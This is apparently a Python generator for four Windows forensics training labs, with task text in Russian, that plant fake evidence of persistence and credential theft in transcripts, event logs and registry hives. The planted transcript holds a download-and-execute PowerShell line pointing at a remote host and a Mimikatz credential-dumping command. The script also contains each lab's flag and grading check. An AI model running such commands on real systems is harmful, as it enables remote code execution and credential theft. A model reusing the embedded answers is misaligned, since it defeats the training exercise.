# Batch FB-2: interactive labs for 4 Windows persistence/telemetry gap lessons.
import base64
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _labgen import lab_block, write_bundle  # noqa: E402

WD = '/home/student/task'


def b64(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.b64encode(data).decode('ascii')


def _dir(p):
    return {'path': p, 'type': 'dir'}


def _f(p, t):
    return {'path': p, 'text': t}


def _b(p, data, mode='644'):
    return {'path': p, 'b64': b64(data), 'mode': mode}


def _lab(lid, title, files, hints, flag, fs, toolset=None):
    return {
        'id': lid, 'category': 'forensics', 'title': title,
        'toolset': toolset or ['core', 'grep', 'strings'],
        'workdir': WD, 'files': files,
        'check': "grep -q 'nto{' found.txt",
        'hints': hints,
        'expect': {'file': f'{WD}/found.txt', 'contains': flag},
        'fs': fs,
    }


def _task(text, rest):
    return [_dir(WD), _f(f'{WD}/task.md', text)] + rest


# --- win-powershell-transcript: transcript text + operational evtx ----------
TRANSCRIPT = (
    '**********************\n'
    'Windows PowerShell transcript start\n'
    'Start time: 20260314021133\n'
    'Username: CORP\\jdoe\n'
    '**********************\n'
    'PS> IEX (New-Object Net.WebClient).DownloadString(\'http://10.10.20.9/a.ps1\')\n'
    'PS> Invoke-Mimikatz -DumpCreds\n'
    "PS> $flag = 'nto{p0w3rsh3ll_tr4nscr1pt_l34k}'\n"
)
PS_EVTX = (b'ElfFile\x00' + b'\x00' * 24 + b'Microsoft-Windows-PowerShell/Operational\r\n'
           b'<EventID>4104</EventID>\r\n'
           b"<ScriptBlockText>Invoke-Mimikatz -DumpCreds</ScriptBlockText>\r\n")

# --- win-sysmon-tuning: Sysmon.evtx with a process-create chain -------------
SYSMON = (b'ElfFile\x00' + b'\x00' * 24 + b'Microsoft-Windows-Sysmon/Operational\r\n'
          b'<EventID>1</EventID>\r\n<Image>C:\\Windows\\System32\\cmd.exe</Image>\r\n'
          b'<ParentImage>C:\\Program Files\\Microsoft Office\\WINWORD.EXE</ParentImage>\r\n'
          b'<CommandLine>cmd.exe /c powershell -w hidden -enc SQBFAFgA</CommandLine>\r\n'
          b'<Hashes>SHA256=9f1a7c</Hashes>\r\n'
          b'<EventID>3</EventID>\r\n<DestinationIp>10.10.20.9</DestinationIp>\r\n'
          b'nto{sysm0n_ch41n_0f_c4us3}\r\n')
SYSMON_CFG = ('<Sysmon schemaversion="4.90">\n'
              '  <EventFiltering>\n'
              '    <ProcessCreate onmatch="exclude"/>\n'
              '    <NetworkConnect onmatch="include"/>\n'
              '  </EventFiltering>\n'
              '</Sysmon>\n')

# --- win-ifeo: SOFTWARE hive with an IFEO Debugger value --------------------
SOFTWARE_HIVE = (b'regf' + b'\x00' * 12 + b'ROOT\x00\x00' + b'Microsoft\x00' +
                 b'\x00' * 16 + b'Image File Execution Options\x00' +
                 b'\x00' * 8 + b'sethc.exe\x00' + b'\x00' * 8 +
                 b'Debugger\x00' + b'C:\\Windows\\Temp\\svc.exe\x00' +
                 b'\x00' * 16 + b'AppInit_DLLs\x00' + b'C:\\Users\\Public\\svc.dll\x00' +
                 b'\x00' * 16 + b'nto{1fe0_s3thc_b4ckd00r}\x00')
SYSTEM_HIVE2 = (b'regf' + b'\x00' * 12 + b'ControlSet001\x00' +
                b'\\Control\\Session Manager\\AppCertDlls\x00' + b'\x00' * 16 +
                b'C:\\Windows\\Temp\\appcert.dll\x00')

# --- win-com-hijack: NTUSER.DAT with a hijacked CLSID -----------------------
NTUSER = (b'regf' + b'\x00' * 12 + b'Software\\Classes\\CLSID\x00' +
          b'{0002DF01-0000-0000-C000-000000000046}\x00' +
          b'InprocServer32\x00' + b'C:\\Users\\Public\\comms.dll\x00' +
          b'\x00' * 16 + b'TreatAs\x00' + b'{0002DF02-0000-0000-C000-000000000046}\x00' +
          b'\x00' * 16 + b'nto{c0m_h1j4ck_hkcu_cls1d}\x00')

SPECS = [
    _lab('win-powershell-transcript', 'Практика: транскрипт PowerShell',
         ['task.md', 'PowerShell_transcript.txt', 'PowerShell-Operational.evtx'],
         ['`ls -la` — посмотри, какие файлы даны.',
          'Стенограмма — обычный текст: `cat PowerShell_transcript.txt`.',
          'Флаг — значение переменной $flag в стенограмме.',
          'Выдели флаг: `grep nto PowerShell_transcript.txt > found.txt`.'],
         'nto{p0w3rsh3ll_tr4nscr1pt_l34k}',
         _task('# Задача: восстановление PowerShell-кода\n\n'
               'Дана стенограмма сессии и журнал Operational. История команд '
               'подчищена, но транскрипт остался. Найди флаг.\n\n'
               '1. `cat PowerShell_transcript.txt`.\n'
               '2. `strings PowerShell-Operational.evtx` — события 4104.\n'
               '3. `grep nto PowerShell_transcript.txt > found.txt`.\n',
               [_f(f'{WD}/PowerShell_transcript.txt', TRANSCRIPT),
                _b(f'{WD}/PowerShell-Operational.evtx', PS_EVTX)]),
         ),
    _lab('win-sysmon-tuning', 'Практика: разбор журнала Sysmon',
         ['task.md', 'Sysmon.evtx', 'sysmonconfig.xml'],
         ['`ls -la` и `file Sysmon.evtx`.',
          'События Sysmon читаются строками: `strings Sysmon.evtx`.',
          'Найди цепочку WINWORD -> cmd -> powershell и флаг.',
          'Выдели флаг: `strings Sysmon.evtx | grep nto > found.txt`.'],
         'nto{sysm0n_ch41n_0f_c4us3}',
         _task('# Задача: цепочка запуска по Sysmon\n\n'
               '`Sysmon.evtx` — журнал Sysmon, `sysmonconfig.xml` — применённая '
               'конфигурация. Восстанови цепочку запуска и найди флаг.\n\n'
               '1. `strings Sysmon.evtx` — события 1/3/22.\n'
               '2. `cat sysmonconfig.xml` — какие события включены.\n'
               '3. `strings Sysmon.evtx | grep nto > found.txt`.\n',
               [_b(f'{WD}/Sysmon.evtx', SYSMON),
                _f(f'{WD}/sysmonconfig.xml', SYSMON_CFG)]),
         ),
    _lab('win-ifeo', 'Практика: IFEO и AppInit в реестре',
         ['task.md', 'SOFTWARE', 'SYSTEM'],
         ['`file SOFTWARE` — реестровый hive (regf).',
          'Ищи ключи IFEO и AppInit: `strings SOFTWARE`.',
          'Обрати внимание на путь к svc.exe в Debugger.',
          'Выдели флаг: `strings SOFTWARE | grep nto > found.txt`.'],
         'nto{1fe0_s3thc_b4ckd00r}',
         _task('# Задача: хайджек загрузки\n\n'
               'Два hive: `SOFTWARE` и `SYSTEM`. В них спрятаны правки IFEO и '
               'AppCertDlls. Найди флаг и объясни технику.\n\n'
               '1. `file SOFTWARE`.\n'
               '2. `strings SOFTWARE` — ключ sethc.exe и Debugger.\n'
               '3. `strings SOFTWARE | grep nto > found.txt`.\n',
               [_b(f'{WD}/SOFTWARE', SOFTWARE_HIVE),
                _b(f'{WD}/SYSTEM', SYSTEM_HIVE2)]),
         ),
    _lab('win-com-hijack', 'Практика: COM-хайджек в HKCU',
         ['task.md', 'NTUSER.DAT'],
         ['`file NTUSER.DAT` — реестровый hive пользователя.',
          'Ищи ветвь Software\\Classes\\CLSID: `strings NTUSER.DAT`.',
          'Сравни InprocServer32 с легитимным System32 и найди TreatAs.',
          'Выдели флаг: `strings NTUSER.DAT | grep nto > found.txt`.'],
         'nto{c0m_h1j4ck_hkcu_cls1d}',
         _task('# Задача: подмена COM-объекта\n\n'
               '`NTUSER.DAT` — hive пользователя. В нём зарегистрирован подменённый '
               'CLSID. Найди путь к DLL атакующего и флаг.\n\n'
               '1. `file NTUSER.DAT`.\n'
               '2. `strings NTUSER.DAT` — CLSID, InprocServer32, TreatAs.\n'
               '3. `strings NTUSER.DAT | grep nto > found.txt`.\n',
               [_b(f'{WD}/NTUSER.DAT', NTUSER)]),
         ),
]
